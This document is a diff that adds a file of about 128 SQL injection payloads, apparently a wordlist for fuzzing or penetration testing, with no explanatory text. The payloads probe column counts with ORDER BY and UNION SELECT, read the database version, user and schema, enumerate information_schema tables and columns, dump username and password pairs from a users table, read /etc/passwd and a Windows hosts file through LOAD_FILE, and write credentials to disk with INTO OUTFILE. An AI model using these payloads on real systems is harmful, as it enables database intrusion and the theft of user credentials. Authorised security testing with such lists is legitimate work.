@@ -1,0 +1,128 @@
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+' ORDER BY 4--
+' ORDER BY 5--
+' ORDER BY 10--
+' ORDER BY 20--
+' ORDER BY 50--
+' ORDER BY 100--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT 1--
+' UNION SELECT 1,2--
+' UNION SELECT 1,2,3--
+' UNION SELECT 1,2,3,4--
+' UNION SELECT 1,2,3,4,5--
+' UNION SELECT 1,2,3,4,5,6--
+' UNION SELECT 1,2,3,4,5,6,7--
+' UNION SELECT 1,2,3,4,5,6,7,8--
+' UNION SELECT 1,2,3,4,5,6,7,8,9--
+' UNION SELECT 1,2,3,4,5,6,7,8,9,10--
+' UNION SELECT 'a'--
+' UNION SELECT 'a','b'--
+' UNION SELECT 'a','b','c'--
+' UNION SELECT 'a','b','c','d'--
+' UNION SELECT 'a','b','c','d','e'--
+' UNION SELECT @@version--
+' UNION SELECT @@version,NULL--
+' UNION SELECT NULL,@@version--
+' UNION SELECT @@version,NULL,NULL--
+' UNION SELECT NULL,@@version,NULL--
+' UNION SELECT NULL,NULL,@@version--
+' UNION SELECT user()--
+' UNION SELECT user(),NULL--
+' UNION SELECT NULL,user()--
+' UNION SELECT user(),NULL,NULL--
+' UNION SELECT NULL,user(),NULL--
+' UNION SELECT NULL,NULL,user()--
+' UNION SELECT database()--
+' UNION SELECT database(),NULL--
+' UNION SELECT NULL,database()--
+' UNION SELECT database(),NULL,NULL--
+' UNION SELECT NULL,database(),NULL--
+' UNION SELECT NULL,NULL,database()--
+' UNION SELECT @@version,user(),database()--
+' UNION SELECT database(),user(),@@version--
+' UNION SELECT @@version,user(),database(),NULL--
+' UNION SELECT NULL,@@version,user(),database()--
+' UNION SELECT table_name FROM information_schema.tables--
+' UNION SELECT table_name,NULL FROM information_schema.tables--
+' UNION SELECT NULL,table_name FROM information_schema.tables--
+' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
+' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--
+' UNION SELECT NULL,NULL,table_name FROM information_schema.tables--
+' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT NULL,table_name FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT NULL,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT NULL,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT GROUP_CONCAT(column_name),NULL FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT username,password FROM users--
+' UNION SELECT username,password,NULL FROM users--
+' UNION SELECT NULL,username,password FROM users--
+' UNION SELECT username,NULL,password FROM users--
+' UNION SELECT CONCAT(username,0x3a,password) FROM users--
+' UNION SELECT NULL,CONCAT(username,0x3a,password) FROM users--
+' UNION SELECT CONCAT(username,0x3a,password),NULL FROM users--
+' UNION SELECT GROUP_CONCAT(username,0x3a,password) FROM users--
+' UNION SELECT NULL,GROUP_CONCAT(username,0x3a,password) FROM users--
+' UNION SELECT GROUP_CONCAT(username,0x3a,password),NULL FROM users--
+' UNION SELECT 1,2,3,4,5,6,7,8,9,10,@@version,12--
+' UNION SELECT 1,2,3,4,5,6,7,8,9,10,user(),12--
+' UNION SELECT 1,2,3,4,5,6,7,8,9,10,database(),12--
+' UNION SELECT 1,2,3,4,5,6,7,8,9,10,GROUP_CONCAT(table_name),12 FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT 1,2,3,4,5,6,7,8,9,10,GROUP_CONCAT(column_name),12 FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT 1,2,3,4,5,6,7,8,9,10,GROUP_CONCAT(username,0x3a,password),12 FROM users--
+' UNION ALL SELECT NULL--
+' UNION ALL SELECT NULL,NULL--
+' UNION ALL SELECT NULL,NULL,NULL--
+' UNION ALL SELECT NULL,NULL,NULL,NULL--
+' UNION ALL SELECT 1,2,3,4--
+' UNION ALL SELECT @@version,user(),database(),NULL--
+' UNION ALL SELECT table_name,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema=database()--
+' UNION ALL SELECT column_name,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
+' UNION ALL SELECT username,password,NULL,NULL FROM users--
+' UNION ALL SELECT CONCAT(username,0x3a,password),NULL,NULL,NULL FROM users--
+' UNION SELECT schema_name FROM information_schema.schemata--
+' UNION SELECT NULL,schema_name FROM information_schema.schemata--
+' UNION SELECT schema_name,NULL FROM information_schema.schemata--
+' UNION SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata--
+' UNION SELECT NULL,GROUP_CONCAT(schema_name) FROM information_schema.schemata--
+' UNION SELECT table_schema,table_name FROM information_schema.tables--
+' UNION SELECT NULL,table_schema,table_name FROM information_schema.tables--
+' UNION SELECT table_schema,table_name,NULL FROM information_schema.tables--
+' UNION SELECT table_name,column_name FROM information_schema.columns WHERE table_schema=database()--
+' UNION SELECT NULL,table_name,column_name FROM information_schema.columns WHERE table_schema=database()--
+' UNION SELECT table_name,column_name,NULL FROM information_schema.columns WHERE table_schema=database()--
+' UNION SELECT CONCAT(table_name,0x3a,column_name) FROM information_schema.columns WHERE table_schema=database()--
+' UNION SELECT NULL,CONCAT(table_name,0x3a,column_name) FROM information_schema.columns WHERE table_schema=database()--
+' UNION SELECT CONCAT(table_name,0x3a,column_name),NULL FROM information_schema.columns WHERE table_schema=database()--
+' UNION SELECT GROUP_CONCAT(CONCAT(table_name,0x3a,column_name)) FROM information_schema.columns WHERE table_schema=database()--
+' UNION SELECT NULL,GROUP_CONCAT(CONCAT(table_name,0x3a,column_name)) FROM information_schema.columns WHERE table_schema=database()--
+' UNION SELECT LOAD_FILE('/etc/passwd')--
+' UNION SELECT NULL,LOAD_FILE('/etc/passwd')--
+' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--
+' UNION SELECT LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts')--
+' UNION SELECT NULL,LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts')--
+' UNION SELECT 1,2,3 INTO OUTFILE '/tmp/output.txt'--
+' UNION SELECT username,password,NULL INTO OUTFILE '/tmp/users.txt' FROM users--
+' UNION SELECT HEX(@@version)--
+' UNION SELECT NULL,HEX(user())--
+' UNION SELECT HEX(database()),NULL--
+' UNION SELECT UNHEX(HEX(@@version))--
+' UNION SELECT NULL,UNHEX(HEX(user()))--
